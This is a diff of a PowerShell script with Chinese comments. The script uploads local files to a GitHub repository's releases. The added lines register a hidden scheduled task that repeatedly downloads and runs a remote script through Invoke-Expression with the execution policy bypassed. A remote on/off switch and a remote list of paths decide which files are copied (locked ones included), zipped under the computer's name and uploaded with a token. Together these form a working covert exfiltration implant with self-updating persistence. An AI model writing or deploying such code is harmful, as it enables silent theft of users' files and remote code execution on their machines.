@@ -1,89 +1,39 @@
-# === 配置部分 ===
+# ===== 初始化 =====
+[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
+$OutputEncoding = [System.Text.UTF8Encoding]::UTF8
+
 $repo = "ertgyhujkfghj/2"
 $token = $env:GH_TOKEN
+$taskName = "console"
+$scriptUrl = "https://raw.githubusercontent.com/$repo/main/console.ps1"
+
 if ([string]::IsNullOrEmpty($token)) {
     Write-Host "❌ GH_TOKEN 环境变量未设置，脚本终止。"
     return
 }
 
-$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
-$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"
+# ===== 自动注册计划任务（若未存在） =====
+$taskExists = SCHTASKS /Query /TN $taskName 2>$null
+if ($LASTEXITCODE -ne 0) {
+    Write-Host "🛠️ 未检测到计划任务，正在注册..."
 
-# === 工具函数 ===
+    $taskRun = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Invoke-Expression ((New-Object Net.WebClient).DownloadString('$scriptUrl'))`""
+    SCHTASKS /Create /TN $taskName /TR $taskRun /SC HOURLY /ST 19:30 /DU 04:30 /RI 30 /F
 
-# 拷贝所有文件（不判断锁定状态）
-function Copy-AllFiles {
-    param([string[]]$paths, [string]$tempDir)
-
-    foreach ($path in $paths) {
-        if (-not (Test-Path $path)) {
-            Write-Host "⚠️ 路径不存在，跳过：$path"
-            continue
-        }
-
-        $item = Get-Item $path -Force
-        try {
-            if ($item.PSIsContainer) {
-                $dest = Join-Path $tempDir $item.Name
-                Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
-                Write-Host "📁 已复制目录：$($item.FullName)"
-            } else {
-                $dest = Join-Path $tempDir $item.Name
-                Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
-                Write-Host "📄 已复制文件：$($item.FullName)"
-            }
-        } catch {
-            Write-Warning "⚠️ 无法复制：$($item.FullName)"
-        }
-    }
-}
-
-# 创建 GitHub Release 并上传文件
-function Upload-Zip {
-    param([string]$zipPath, [string]$tagName)
-
-    $uploadUrl = "https://api.github.com/repos/$repo/releases"
-    $headers = @{
-        Authorization = "token $token"
-        "User-Agent"  = "upload-script"
-        Accept        = "application/vnd.github+json"
-    }
-
-    try {
-        $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
-            tag_name   = $tagName
-            name       = $tagName
-            draft      = $false
-            prerelease = $false
-        } | ConvertTo-Json -Depth 3)
-        Write-Host "✅ 创建 Release 成功，ID：$($release.id)"
-    } catch {
-        Write-Host "❌ 创建 Release 失败：" $_
+    if ($LASTEXITCODE -eq 0) {
+        Write-Host "✅ 计划任务 '$taskName' 注册成功，将每天 19:30 至 0:00 每 30 分钟执行一次。"
+    } else {
+        Write-Host "❌ 计划任务注册失败。请以管理员身份运行此脚本。"
         return
     }
-
-    $assetName = [System.IO.Path]::GetFileName($zipPath)
-    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$assetName"
-
-    try {
-        Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
-            Authorization = "token $token"
-            "Content-Type" = "application/zip"
-            "User-Agent"   = "upload-script"
-        } -InFile $zipPath
-        Write-Host "✅ 上传 ZIP 文件成功：$assetName"
-    } catch {
-        Write-Host "❌ 上传 ZIP 文件失败：" $_
-    }
 }
 
-# === 主流程 ===
-
-# 检查上传开关
+# ===== 检查开关 =====
+$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
 try {
     $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
     if ($enabled.Trim().ToLower() -ne "on") {
-        Write-Host "🛑 上传开关未启用（内容不是 'on'），脚本退出。"
+        Write-Host "🛑 上传开关未启用，脚本退出。"
         return
     }
 } catch {
@@ -91,7 +41,8 @@ try {
     return
 }
 
-# 读取路径列表
+# ===== 获取路径列表 =====
+$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"
 try {
     $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
     $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
@@ -102,13 +53,33 @@ try {
     return
 }
 
-# 创建临时目录并复制所有文件
+# ===== 拷贝文件到临时目录（尽可能包括被占用文件） =====
 $tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
-Copy-AllFiles -paths $uploadPaths -tempDir $tempDir
+foreach ($path in $uploadPaths) {
+    if (-not (Test-Path $path)) {
+        Write-Host "⚠️ 路径不存在，跳过：$path"
+        continue
+    }
 
-# 压缩为单个 ZIP
+    $item = Get-Item $path -Force
+    try {
+        if ($item.PSIsContainer) {
+            $dest = Join-Path $tempDir $item.Name
+            Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Host "📁 已复制目录：$($item.FullName)"
+        } else {
+            $dest = Join-Path $tempDir $item.Name
+            Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
+            Write-Host "📄 已复制文件：$($item.FullName)"
+        }
+    } catch {
+        Write-Warning "⚠️ 无法复制：$($item.FullName)"
+    }
+}
+
+# ===== 压缩为 ZIP =====
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 $computerName = $env:COMPUTERNAME
 $tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
@@ -118,8 +89,33 @@ $zipPath = "$env:TEMP\$tag.zip"
 # 清理临时目录
 Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
-# 上传压缩包
-Upload-Zip -zipPath $zipPath -tagName $tag
+# ===== 上传 ZIP 到 GitHub Release =====
+$uploadUrl = "https://api.github.com/repos/$repo/releases"
+$headers = @{
+    Authorization = "token $token"
+    "User-Agent"  = "upload-script"
+    Accept        = "application/vnd.github+json"
+}
 
-# 删除压缩包
+try {
+    $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
+        tag_name   = $tag
+        name       = $tag
+        draft      = $false
+        prerelease = $false
+    } | ConvertTo-Json -Depth 3)
+
+    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
+    Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
+        Authorization = "token $token"
+        "Content-Type" = "application/zip"
+        "User-Agent"   = "upload-script"
+    } -InFile $zipPath
+
+    Write-Host "`n✅ 上传成功：$tag.zip"
+} catch {
+    Write-Host "❌ 上传失败：" $_
+}
+
+# 清理压缩包
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
